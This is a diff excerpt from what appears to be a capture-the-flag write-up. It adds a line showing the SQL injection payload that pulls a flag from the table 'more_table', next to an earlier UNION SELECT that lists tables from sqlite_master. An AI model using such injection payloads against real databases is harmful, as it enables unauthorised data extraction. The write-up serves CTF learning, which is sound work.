@@ -29,3 +29,5 @@ The rest is pretty standard, with some union selects with the master database ta
 `' UNION SELECT name, sql, NULL from sqlite_master --`
 
 We find the `more_table` table with a flag column. we use another UNION select to get the contents, giving us the flag.
+
+`' UNION SELECT flag, NULL, NULL FROM more_table --`
